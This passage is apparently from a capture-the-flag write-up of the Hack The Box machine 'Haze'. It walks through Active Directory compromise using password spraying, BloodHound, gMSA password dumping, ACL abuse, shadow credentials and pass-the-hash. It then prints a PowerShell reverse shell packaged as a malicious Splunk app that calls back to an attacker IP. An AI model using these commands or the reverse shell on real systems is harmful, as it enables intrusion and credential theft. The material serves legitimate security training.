+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ nxc smb 10.10.11.61 -u <span class="string">&#x27;paul.taylor&#x27;</span> -p <span class="string">&#x27;Ld@p_Auth_Sp1unk@2k24&#x27;</span></span><br><span class="line">SMB         10.10.11.61     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.11.61     445    DC01             [+] haze.htb\paul.taylor:Ld@p_Auth_Sp1unk@2k24</span><br></pre></td></tr></table></figure></div>
+<ul>
+<li>paul.taylor:Ld@p_Auth_Sp1unk@2k24</li>
+</ul>
+<p>Rid Brute</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ nxc smb 10.10.11.61 -u <span class="string">&#x27;paul.taylor&#x27;</span> -p <span class="string">&#x27;Ld@p_Auth_Sp1unk@2k24&#x27;</span> --rid-brute | grep SidTypeUser</span><br><span class="line">SMB                      10.10.11.61     445    DC01             500: HAZE\Administrator (SidTypeUser)</span><br><span class="line">SMB                      10.10.11.61     445    DC01             501: HAZE\Guest (SidTypeUser)</span><br><span class="line">SMB                      10.10.11.61     445    DC01             502: HAZE\krbtgt (SidTypeUser)</span><br><span class="line">SMB                      10.10.11.61     445    DC01             1000: HAZE\DC01$ (SidTypeUser)</span><br><span class="line">SMB                      10.10.11.61     445    DC01             1103: HAZE\paul.taylor (SidTypeUser)</span><br><span class="line">SMB                      10.10.11.61     445    DC01             1104: HAZE\mark.adams (SidTypeUser)</span><br><span class="line">SMB                      10.10.11.61     445    DC01             1105: HAZE\edward.martin (SidTypeUser)</span><br><span class="line">SMB                      10.10.11.61     445    DC01             1106: HAZE\alexander.green (SidTypeUser)</span><br><span class="line">SMB                      10.10.11.61     445    DC01             1111: HAZE\Haze-IT-Backup$ (SidTypeUser)</span><br></pre></td></tr></table></figure></div>
+<ul>
+<li>paul.taylor</li>
+<li>mark.adams</li>
+<li>edward.martin</li>
+<li>alexander.green</li>
+<li>Haze-IT-Backup</li>
+</ul>
+<p>Shared password discovery</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ nxc smb 10.10.11.61 -u user -p <span class="string">&#x27;Ld@p_Auth_Sp1unk@2k24&#x27;</span> --continue-on-success</span><br><span class="line">SMB         10.10.11.61     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.11.61     445    DC01             [+] haze.htb\paul.taylor:Ld@p_Auth_Sp1unk@2k24</span><br><span class="line">SMB         10.10.11.61     445    DC01             [+] haze.htb\mark.adams:Ld@p_Auth_Sp1unk@2k24</span><br><span class="line">SMB         10.10.11.61     445    DC01             [-] haze.htb\edward.martin:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE</span><br><span class="line">SMB         10.10.11.61     445    DC01             [-] haze.htb\alexander.green:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE</span><br><span class="line">SMB         10.10.11.61     445    DC01             [-] haze.htb\Haze-IT-Backup:Ld@p_Auth_Sp1unk@2k24 STATUS_LOGON_FAILURE</span><br></pre></td></tr></table></figure></div>
+
+<p>Winrm allow</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ nxc winrm 10.10.11.61 -u user -p <span class="string">&#x27;Ld@p_Auth_Sp1unk@2k24&#x27;</span> --continue-on-success</span><br><span class="line">[...]</span><br><span class="line">WINRM       10.10.11.61     5985   DC01             [+] haze.htb\mark.adams:Ld@p_Auth_Sp1unk@2k24 (Pwn3d!)</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure></div>
+<p>Bloodhound-python</p>
+<ul>
+<li><p>as paul.taylor</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ bloodhound-python -u <span class="string">&#x27;paul.taylor&#x27;</span> -p <span class="string">&#x27;Ld@p_Auth_Sp1unk@2k24&#x27;</span> -d haze.htb -dc dc01.haze.htb -ns 10.10.11.61 -c All</span><br><span class="line">INFO: BloodHound.py <span class="keyword">for</span> BloodHound LEGACY (BloodHound 4.2 and 4.3)</span><br><span class="line">INFO: Found AD domain: haze.htb</span><br><span class="line">INFO: Getting TGT <span class="keyword">for</span> user</span><br><span class="line">INFO: Connecting to LDAP server: dc01.haze.htb</span><br><span class="line">INFO: Found 1 domains</span><br><span class="line">INFO: Found 1 domains <span class="keyword">in</span> the forest</span><br><span class="line">INFO: Found 1 computers</span><br><span class="line">INFO: Connecting to LDAP server: dc01.haze.htb</span><br><span class="line">INFO: Found 3 <span class="built_in">users</span></span><br><span class="line">INFO: Found 32 <span class="built_in">groups</span></span><br><span class="line">INFO: Found 2 gpos</span><br><span class="line">INFO: Found 2 ous</span><br><span class="line">INFO: Found 18 containers</span><br><span class="line">INFO: Found 0 trusts</span><br><span class="line">INFO: Starting computer enumeration with 10 workers</span><br><span class="line">INFO: Querying computer: dc01.haze.htb</span><br><span class="line">INFO: Done <span class="keyword">in</span> 00M 06S</span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p>as mark.adams</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ bloodhound-python -u <span class="string">&#x27;mark.adams&#x27;</span> -p <span class="string">&#x27;Ld@p_Auth_Sp1unk@2k24&#x27;</span> -ns 10.10.11.61 -d haze.htb -dc dc01.</span><br><span class="line">haze.htb -c All</span><br><span class="line">INFO: BloodHound.py <span class="keyword">for</span> BloodHound LEGACY (BloodHound 4.2 and 4.3)</span><br><span class="line">INFO: Found AD domain: haze.htb</span><br><span class="line">INFO: Getting TGT <span class="keyword">for</span> user</span><br><span class="line">INFO: Connecting to LDAP server: dc01.haze.htb</span><br><span class="line">INFO: Found 1 domains</span><br><span class="line">INFO: Found 1 domains <span class="keyword">in</span> the forest</span><br><span class="line">INFO: Found 1 computers</span><br><span class="line">INFO: Connecting to LDAP server: dc01.haze.htb</span><br><span class="line">INFO: Found 8 <span class="built_in">users</span></span><br><span class="line">INFO: Found 57 <span class="built_in">groups</span></span><br><span class="line">INFO: Found 2 gpos</span><br><span class="line">INFO: Found 2 ous</span><br><span class="line">INFO: Found 19 containers</span><br><span class="line">INFO: Found 0 trusts</span><br><span class="line">INFO: Starting computer enumeration with 10 workers</span><br><span class="line">INFO: Querying computer: dc01.haze.htb</span><br><span class="line">INFO: Done <span class="keyword">in</span> 00M 05S</span><br></pre></td></tr></table></figure></div></li>
+</ul>
+<p>Reading managed password of Haze-IT-Backups$<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/htb-haze/Pasted image 20250330123720.png"
+                      width="500"
+                ></p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#From evil-winrm session</span></span><br><span class="line">*Evil-WinRM* PS C:\Users\mark.adams\Desktop&gt; Set-ADServiceAccount -Identity <span class="string">&quot;Haze-IT-Backup$&quot;</span> -PrincipalsAllowedToRetrieveManagedPassword mark.adams</span><br><span class="line"></span><br><span class="line"><span class="comment">#using gMSADumper.py from attacker machine</span></span><br><span class="line">$ python3 gMSADumper.py -u mark.adams -p <span class="string">&#x27;Ld@p_Auth_Sp1unk@2k24&#x27;</span> -d haze.htb -l dc01.haze.htb</span><br><span class="line">Users or <span class="built_in">groups</span> <span class="built_in">who</span> can <span class="built_in">read</span> password <span class="keyword">for</span> Haze-IT-Backup$:</span><br><span class="line"> &gt; mark.adams</span><br><span class="line">Haze-IT-Backup$:::735c02c6b2dc54c3c8c6891f55279ebc</span><br><span class="line">Haze-IT-Backup$:aes256-cts-hmac-sha1-96:38c90a95f7e038a6cb57d3e21c405c2875e88f1edbb1e082f1dd75d01eda60fd</span><br><span class="line">Haze-IT-Backup$:aes128-cts-hmac-sha1-96:0926f5e64d85018a506ecadff3df4f95</span><br></pre></td></tr></table></figure></div>
+
+<p>After getting the NTLM hash of Haze-IT-Backup$, rerun bloodhound-python for the 3rd time</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ bloodhound-python -u <span class="string">&#x27;Haze-IT-Backup$&#x27;</span> --hashes <span class="string">&#x27;:735c02c6b2dc54c3c8c6891f55279ebc&#x27;</span> -ns 10.10.11.61 -d haze.htb -dc dc01.haze.htb -c all</span><br><span class="line">INFO: BloodHound.py <span class="keyword">for</span> BloodHound LEGACY (BloodHound 4.2 and 4.3)</span><br><span class="line">INFO: Found AD domain: haze.htb</span><br><span class="line">INFO: Getting TGT <span class="keyword">for</span> user</span><br><span class="line">INFO: Connecting to LDAP server: dc01.haze.htb</span><br><span class="line">INFO: Found 1 domains</span><br><span class="line">INFO: Found 1 domains <span class="keyword">in</span> the forest</span><br><span class="line">INFO: Found 1 computers</span><br><span class="line">INFO: Connecting to LDAP server: dc01.haze.htb</span><br><span class="line">INFO: Found 9 <span class="built_in">users</span></span><br><span class="line">INFO: Found 57 <span class="built_in">groups</span></span><br><span class="line">INFO: Found 2 gpos</span><br><span class="line">INFO: Found 2 ous</span><br><span class="line">INFO: Found 20 containers</span><br><span class="line">INFO: Found 0 trusts</span><br><span class="line">INFO: Starting computer enumeration with 10 workers</span><br><span class="line">INFO: Querying computer: dc01.haze.htb</span><br><span class="line">INFO: Done <span class="keyword">in</span> 00M 05S</span><br></pre></td></tr></table></figure></div>
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/htb-haze/Pasted image 20250330125224.png"
+                      width="500"
+                >
+
+
+<ul>
+<li>Haze-IT-Backup has WriteOwner over SUPPORT_SERVICES<ul>
+<li>which can ForceChangePassword on edward.martin</li>
+</ul>
+</li>
+</ul>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ bloodyAD --host <span class="string">&quot;10.10.11.61&quot;</span> -d <span class="string">&#x27;haze.htb&#x27;</span> -u <span class="string">&#x27;Haze-IT-Backup$&#x27;</span> -p <span class="string">&quot;:735c02c6b2dc54c3c8c6891f55279ebc&quot;</span> -f rc4 <span class="built_in">set</span> owner <span class="string">&#x27;SUPPORT_SERVICES&#x27;</span> <span class="string">&#x27;Haze-IT-Backup$&#x27;</span></span><br><span class="line"></span><br><span class="line">[+] Old owner S-1-5-21-323145914-28650650-2368316563-512 is now replaced by Haze-IT-Backup$ on SUPPORT_SERVICES</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>Forging authentication ticket for Haze-IT-Backup$</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">muyi@mag3:~/Desktop/htb/machines/haze~10.10.11.61/bh/haze-it$ impacket-getTGT -aesKey 38c90a95f7e038a6cb57d3e21c405c2875e88f1edbb1e082f1dd75d01eda60fd haze.htb/Haze-IT-Backup$</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">[*] Saving ticket <span class="keyword">in</span> Haze-IT-Backup$.ccache</span><br><span class="line"></span><br><span class="line">muyi@mag3:~/Desktop/htb/machines/haze~10.10.11.61/bh/haze-it$ <span class="built_in">export</span> KRB5CCNAME=./Haze-IT-Backup\$.ccache</span><br><span class="line"></span><br><span class="line">muyi@mag3:~/Desktop/htb/machines/haze~10.10.11.61/bh/haze-it$ klist</span><br><span class="line">Ticket cache: FILE:./Haze-IT-Backup$.ccache</span><br><span class="line">Default principal: Haze-IT-Backup<span class="variable">$@HAZE</span>.HTB</span><br><span class="line"></span><br><span class="line">Valid starting       Expires              Service principal</span><br><span class="line">03/30/2025 20:43:08  03/31/2025 06:43:08  krbtgt/HAZE.HTB@HAZE.HTB</span><br><span class="line">        renew <span class="keyword">until</span> 03/31/2025 20:43:08</span><br></pre></td></tr></table></figure></div>
+
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">muyi@mag3:~/Desktop/htb/machines/haze~10.10.11.61/bh/haze-it$ bloodyAD -d haze.htb --host 10.10.11.61 -u <span class="string">&#x27;Haze-IT-Backup$&#x27;</span> -p :735c02c6b2dc54c3c8c6891f55279ebc add genericAll <span class="string">&quot;SUPPORT_SERVICES&quot;</span> <span class="string">&#x27;Haze-IT-Backup$&#x27;</span></span><br><span class="line">[+] Haze-IT-Backup$ has now GenericAll on SUPPORT_SERVICES</span><br><span class="line"></span><br><span class="line">muyi@mag3:~/Desktop/htb/machines/haze~10.10.11.61/bh/haze-it$ bloodyAD --host <span class="string">&quot;10.10.11.61&quot;</span> -d <span class="string">&quot;haze.htb&quot;</span> -u <span class="string">&#x27;Haze-IT-Backup$&#x27;</span> -p <span class="string">&quot;:735C02C6B2DC54C3C8C6891F55279EBC&quot;</span> -f rc4 <span class="built_in">set</span> owner <span class="string">&#x27;SUPPORT_SERVICES&#x27;</span> <span class="string">&#x27;Haze-IT-Backup$&#x27;</span> &amp;&amp; bloodyAD --host <span class="string">&quot;10.10.11.61&quot;</span> -d <span class="string">&quot;haze.htb&quot;</span> -u <span class="string">&quot;Haze-IT-Backup$&quot;</span> -p <span class="string">&quot;:735C02C6B2DC54C3C8C6891F55279EBC&quot;</span> add groupMember <span class="string">&quot;SUPPORT_SERVICES&quot;</span> <span class="string">&#x27;Haze-IT-Backup$&#x27;</span></span><br><span class="line">[!] S-1-5-21-323145914-28650650-2368316563-1111 is already the owner, no modification will be made</span><br><span class="line">[+] Haze-IT-Backup$ added to SUPPORT_SERVICES</span><br><span class="line"></span><br><span class="line">muyi@mag3:~/Desktop/htb/machines/haze~10.10.11.61/bh/haze-it$ bloodyAD --host <span class="string">&quot;10.10.11.61&quot;</span> -d <span class="string">&quot;haze.htb&quot;</span> -u <span class="string">&quot;Haze-IT-Backup$&quot;</span> -p <span class="string">&quot;:735C02C6B2DC54C3C8C6891F55279EBC&quot;</span> add shadowCredentials <span class="string">&#x27;edward.martin&#x27;</span></span><br><span class="line">[+] KeyCredential generated with following sha256 of RSA key: 767488ddc07326c68c2f58af7da6b6bc11759db29046e00c64217e243f67a663</span><br><span class="line">No outfile path was provided. The certificate(s) will be stored with the filename: TpAhLyv5</span><br><span class="line">[+] Saved PEM certificate at path: TpAhLyv5_cert.pem</span><br><span class="line">[+] Saved PEM private key at path: TpAhLyv5_priv.pem</span><br><span class="line">A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools</span><br><span class="line">Run the following <span class="built_in">command</span> to obtain a TGT:</span><br><span class="line">python3 PKINITtools/gettgtpkinit.py -cert-pem TpAhLyv5_cert.pem -key-pem TpAhLyv5_priv.pem haze.htb/edward.martin TpAhLyv5.ccache</span><br><span class="line"></span><br><span class="line">muyi@mag3:~/Desktop/htb/machines/haze~10.10.11.61/bh/haze-it$ python3 PKINITtools/gettgtpkinit.py -cert-pem TpAhLyv5_cert.pem -key-pem TpAhLyv5_priv.pem haze.htb/edward.martin TpAhLyv5.ccache</span><br><span class="line">2025-03-30 21:25:16,510 minikerberos INFO     Loading certificate and key from file</span><br><span class="line">INFO:minikerberos:Loading certificate and key from file</span><br><span class="line">2025-03-30 21:25:16,516 minikerberos INFO     Requesting TGT</span><br><span class="line">INFO:minikerberos:Requesting TGT</span><br><span class="line">2025-03-30 21:25:20,977 minikerberos INFO     AS-REP encryption key (you might need this later):</span><br><span class="line">INFO:minikerberos:AS-REP encryption key (you might need this later):</span><br><span class="line">2025-03-30 21:25:20,977 minikerberos INFO     a6d8322d85ff7f2e5c157592f9563239fa1807e89ea3ccd1056461f4c1c85b4f</span><br><span class="line">INFO:minikerberos:a6d8322d85ff7f2e5c157592f9563239fa1807e89ea3ccd1056461f4c1c85b4f</span><br><span class="line">2025-03-30 21:25:20,978 minikerberos INFO     Saved TGT to file</span><br><span class="line">INFO:minikerberos:Saved TGT to file</span><br><span class="line"></span><br><span class="line">muyi@mag3:~/Desktop/htb/machines/haze~10.10.11.61/bh/haze-it$ <span class="built_in">export</span> KRB5CCNAME=TpAhLyv5.ccache</span><br><span class="line"></span><br><span class="line">muyi@mag3:~/Desktop/htb/machines/haze~10.10.11.61/bh/haze-it$ python3 PKINITtools/getnthash.py -key a6d8322d85ff7f2e5c157592f9563239fa1807e89ea3ccd1056461f4c1c85b4f haze.htb/edward.martin</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">[*] Using TGT from cache</span><br><span class="line">[*] Requesting ticket to self with PAC</span><br><span class="line">Recovered NT Hash</span><br><span class="line">09e0b3eeb2e7a6b0d419e9ff8f4d91af</span><br></pre></td></tr></table></figure></div>
+
+<p>User.txt</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">muyi@mag3:~$ evil-winrm -i 10.10.11.61 -u edward.martin --<span class="built_in">hash</span> 09e0b3eeb2e7a6b0d419e9ff8f4d91af</span><br><span class="line"></span><br><span class="line">Evil-WinRM shell v3.7</span><br><span class="line"></span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc<span class="string">&#x27; for module Reline</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Info: Establishing connection to remote endpoint</span></span><br><span class="line"><span class="string">*Evil-WinRM* PS C:\Users\edward.martin\Documents&gt; cd ../Desktop</span></span><br><span class="line"><span class="string">*Evil-WinRM* PS C:\Users\edward.martin\Desktop&gt; ls</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Directory: C:\Users\edward.martin\Desktop</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Mode                 LastWriteTime         Length Name</span></span><br><span class="line"><span class="string">----                 -------------         ------ ----</span></span><br><span class="line"><span class="string">-ar---         3/30/2025   6:14 AM             34 user.txt</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">*Evil-WinRM* PS C:\Users\edward.martin\Desktop&gt; cat user.txt</span></span><br><span class="line"><span class="string">f9ce51273ceafa1a928508cb5b1bf4b7</span></span><br></pre></td></tr></table></figure></div>
+
+
+<h2 id="Priv-Esc"><a href="#Priv-Esc" class="headerlink" title="Priv Esc"></a>Priv Esc</h2><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/htb-haze/Pasted image 20250330135420.png"
+                      width="500"
+                >
+
+
+<p>From bloodhound, we know that edward.martin is one of the backup reviewers</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Backups\Splunk&gt; <span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Backups\Splunk</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">-a----          8/6/2024   3:22 PM       27445566 splunk_backup_2024-08-06.zip</span><br></pre></td></tr></table></figure></div>
+<ul>
+<li>download the splunk.zip and unzip it in the attacker machine</li>
+</ul>
+<p>Find the authentication.conf as per usual</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">muyi@mag3:~/Desktop/htb/machines/haze~10.10.11.61/Splunk/Splunk/var/run/splunk/confsnapshot/baseline_local/system/local$ <span class="built_in">cat</span> authentication.conf</span><br><span class="line">[...]</span><br><span class="line">bindDN = CN=alexander.green,CN=Users,DC=haze,DC=htb</span><br><span class="line">bindDNpassword = $1<span class="variable">$YDz8WfhoCWmf6aTRkA</span>+QqUI=</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure></div>
+
+<p>Decrypt it using splunksecrets and the splunk.secret from etc&#x2F;auth</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ splunksecrets splunk-decrypt -S splunk.secret</span><br><span class="line">Ciphertext: $1<span class="variable">$YDz8WfhoCWmf6aTRkA</span>+QqUI=</span><br><span class="line">Sp1unkadmin@2k24</span><br></pre></td></tr></table></figure></div>
+<ul>
+<li>use the password with “admin” discovered from etc&#x2F;passwd<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">muyi@mag3:~/Desktop/htb/machines/haze~10.10.11.61/Splunk/Splunk$ <span class="built_in">cat</span> etc/passwd</span><br><span class="line">:admin:$6$8FRibWS3pDNoVWHU<span class="variable">$vTW2NYea7GiZoN0nE6asP6xQsec44MlcK2ZehY5RC4xeTAz4kVVcbCkQ9xBI2c7A8VPmajczPOBjcVgccXbr9</span>/::Administrator:admin:changeme@example.com:::19934</span><br></pre></td></tr></table></figure></div></li>
+</ul>
+<p>Logged into Splunk<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/htb-haze/Pasted image 20250330140033.png"
+                     
+                ></p>
+<p>Using a POC by 0xjpuff [reverse_shell_splunk]</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">muyi@mag3:~/Desktop/htb/machines/haze~10.10.11.61/reverse_shell_splunk/reverse_shell_splunk/bin$ <span class="built_in">cat</span> run.ps1</span><br><span class="line"><span class="comment">#A simple and small reverse shell. Options and help removed to save space.</span></span><br><span class="line"><span class="comment">#Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.</span></span><br><span class="line"><span class="variable">$client</span> = New-Object System.Net.Sockets.TCPClient(<span class="string">&#x27;10.10.16.6&#x27;</span>,9999);<span class="variable">$stream</span> = <span class="variable">$client</span>.GetStream();[byte[]]<span class="variable">$bytes</span> = 0..65535|%&#123;0&#125;;<span class="keyword">while</span>((<span class="variable">$i</span> = <span class="variable">$stream</span>.Read(<span class="variable">$bytes</span>, <span class="number">0</span>, <span class="variable">$bytes</span>.Length)) -ne 0)&#123;;<span class="variable">$data</span> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>,0, <span class="variable">$i</span>);<span class="variable">$sendback</span> = (iex <span class="variable">$data</span> 2&gt;&amp;1 | Out-String );<span class="variable">$sendback2</span>  = <span class="variable">$sendback</span> + <span class="string">&#x27;PS &#x27;</span> + (<span class="built_in">pwd</span>).Path + <span class="string">&#x27;&gt; &#x27;</span>;<span class="variable">$sendbyte</span> = ([text.encoding]::ASCII).GetBytes(<span class="variable">$sendback2</span>);<span class="variable">$stream</span>.Write(<span class="variable">$sendbyte</span>,0,<span class="variable">$sendbyte</span>.Length);<span class="variable">$stream</span>.Flush()&#125;;<span class="variable">$client</span>.Close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># After modifying bin/run.ps1 due to target being Windows machine</span></span><br><span class="line">muyi@mag3:~/Desktop/htb/machines/haze~10.10.11.61/reverse_shell_splunk$ tar -cvzf reverse_shell_splunk.tgz reverse_shell_splunk/</span><br><span class="line">reverse_shell_splunk/</span><br><span class="line">reverse_shell_splunk/bin/</span><br><span class="line">reverse_shell_splunk/bin/run.bat</span><br><span class="line">reverse_shell_splunk/bin/run.ps1</span><br><span class="line">reverse_shell_splunk/bin/rev.py</span><br><span class="line">reverse_shell_splunk/default/</span><br><span class="line">reverse_shell_splunk/default/inputs.conf</span><br><span class="line"></span><br><span class="line">muyi@mag3:~/Desktop/htb/machines/haze~10.10.11.61/reverse_shell_splunk$ <span class="built_in">mv</span> reverse_shell_splunk.tgz reverse_shell_splunk.spl</span><br></pre></td></tr></table></figure></div>
+
+<p>Install the App from Splunk Website<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/htb-haze/Pasted image 20250330140823.png"
+                      width="500"
+                ></p>
+<p>Once installed and restarted, on the listener port</p>
